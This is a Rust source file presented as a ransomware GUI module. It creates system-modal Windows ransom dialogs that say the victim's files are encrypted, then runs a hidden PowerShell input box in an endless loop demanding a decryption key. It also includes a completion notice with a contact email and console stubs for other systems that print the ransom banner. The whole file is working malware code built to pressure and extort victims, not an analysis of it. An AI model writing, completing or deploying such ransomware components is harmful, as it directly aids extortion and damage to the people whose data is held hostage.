/// Ransomware GUI dialog module
/// Creates persistent Windows dialogs for ransom messages

#[cfg(target_os = "windows")]
pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONWARNING, MB_SYSTEMMODAL, MB_TOPMOST};
    use std::ptr;

    // Mostrar primer mensaje de advertencia
    let title = wide_string(" SYSTEM LOCKED");
    let message_text = format!(
        "  YOUR FILES HAVE BEEN ENCRYPTED  \n\n\
         All your important files are now encrypted with military-grade encryption.\n\n\
          To recover your files, you need the decryption key.\n\n\
          Check RANSOM_NOTE.txt in the encrypted directories for instructions.\n\n\
         Contact: EMAIL\n\n\
          DO NOT restart your computer or delete any files.\n\
          This is your only warning!\n\n\
         Press OK to enter the decryption key."
    );
    let message = wide_string(&message_text);

    unsafe {
        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL | MB_TOPMOST
        );
    }

    // Loop persistente pidiendo la key usando PowerShell InputBox
    loop {
        let ps_script = r#"Add-Type -AssemblyName Microsoft.VisualBasic;
[Microsoft.VisualBasic.Interaction]::InputBox(
' YOUR FILES HAVE BEEN ENCRYPTED!

To recover your files, enter the decryption key below.

Check RANSOM_NOTE.txt for the key.

Contact: EMAIL

  WARNING: Do not restart or your data will be lost permanently!',
'DECRYPTION KEY REQUIRED',
'')"#;

        let output = std::process::Command::new("powershell")
            .args(&["-WindowStyle", "Hidden", "-Command", ps_script])
            .output();

        match output {
            Ok(result) => {
                let user_key = String::from_utf8_lossy(&result.stdout).trim().to_string();

                if user_key.is_empty() {
                    // Usuario canceló o no ingresó nada
                    let error_title = wide_string(" ERROR");
                    let error_msg = wide_string(
                        "You must enter the decryption key to recover your files!\n\n\
                         Without the key, your files cannot be recovered.\n\n\
                         Try again or check RANSOM_NOTE.txt for instructions."
                    );

                    unsafe {
                        MessageBoxW(
                            ptr::null_mut(),
                            error_msg.as_ptr(),
                            error_title.as_ptr(),
                            MB_OK | MB_ICONWARNING | MB_TOPMOST
                        );
                    }
                    continue;
                }

                if user_key == correct_key {
                    // Key correcta!
                    let success_title = wide_string(" SUCCESS");
                    let success_msg = wide_string(
                        "Key accepted! Your files are being decrypted...\n\n\
                         Please wait while your files are restored.\n\
                         This may take a few moments."
                    );

                    unsafe {
                        MessageBoxW(
                            ptr::null_mut(),
                            success_msg.as_ptr(),
                            success_title.as_ptr(),
                            MB_OK | MB_TOPMOST
                        );
                    }
                    return Ok(());
                } else {
                    // Key incorrecta
                    let error_title = wide_string(" INVALID KEY");
                    let error_msg = wide_string(
                        "The key you entered is incorrect!\n\n\
                         Please check RANSOM_NOTE.txt and try again.\n\n\
                         Contact: EMAIL\n\n\
                         The correct key is in the note file."
                    );

                    unsafe {
                        MessageBoxW(
                            ptr::null_mut(),
                            error_msg.as_ptr(),
                            error_title.as_ptr(),
                            MB_OK | MB_ICONWARNING | MB_TOPMOST
                        );
                    }
                }
            }
            Err(_) => {
                // Si falla PowerShell, mostrar error y reintentar
                let error_title = wide_string(" ERROR");
                let error_msg = wide_string(
                    "Failed to show input dialog. Retrying...\n\n\
                     Make sure PowerShell is available on your system."
                );

                unsafe {
                    MessageBoxW(
                        ptr::null_mut(),
                        error_msg.as_ptr(),
                        error_title.as_ptr(),
                        MB_OK | MB_ICONWARNING | MB_TOPMOST
                    );
                }
                continue;
            }
        }
    }
}

/// Shows a simple warning dialog after encryption completes (non-blocking)
#[cfg(target_os = "windows")]
pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONWARNING, MB_TOPMOST};
    use std::ptr;

    let title = wide_string(" ENCRYPTION COMPLETE");
    let message_text = format!(
        "  YOUR FILES HAVE BEEN ENCRYPTED  \n\n\
         {} files have been encrypted with military-grade encryption.\n\n\
          Key ID: {}...\n\n\
          Check RANSOM_NOTE.txt for full instructions.\n\n\
          Contact: ransomware@protonmail.com\n\n\
          DO NOT restart or shutdown your computer\n\
          DO NOT delete any files or RANSOM_NOTE.txt\n\n\
         Your files can be recovered with the correct decryption key.",
        "Multiple",
        &key_hint[..16.min(key_hint.len())]
    );
    let message = wide_string(&message_text);

    unsafe {
        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONWARNING | MB_TOPMOST
        );
    }

    Ok(())
}

#[cfg(target_os = "windows")]
pub fn show_encryption_progress_dialog(files_count: usize) -> Result<(), String> {
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONINFORMATION, MB_TOPMOST};
    use std::ptr;

    let title = wide_string(" Encryption in Progress");
    let message_text = format!(
        "Please wait...\n\n\
         Processing {} files\n\
         This may take a few moments.\n\n\
         Do not close this window or shutdown your computer.",
        files_count
    );
    let message = wide_string(&message_text);

    unsafe {
        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONINFORMATION | MB_TOPMOST
        );
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn wide_string(s: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

#[cfg(not(target_os = "windows"))]
pub fn show_ransom_dialog(_key_hint: &str) -> Result<(), String> {
    println!("\n╔═══════════════════════════════════════════════════════════╗");
    println!("║                                                           ║");
    println!("║         YOUR FILES HAVE BEEN ENCRYPTED                    ║");
    println!("║                                                           ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
    println!("\nCheck RANSOM_NOTE.txt for instructions.");
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn show_encryption_progress_dialog(_files_count: usize) -> Result<(), String> {
    println!("Encryption in progress...");
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn show_encryption_complete_dialog(_key_hint: &str) -> Result<(), String> {
    println!("Encryption complete. Check RANSOM_NOTE.txt for instructions.");
    Ok(())
}
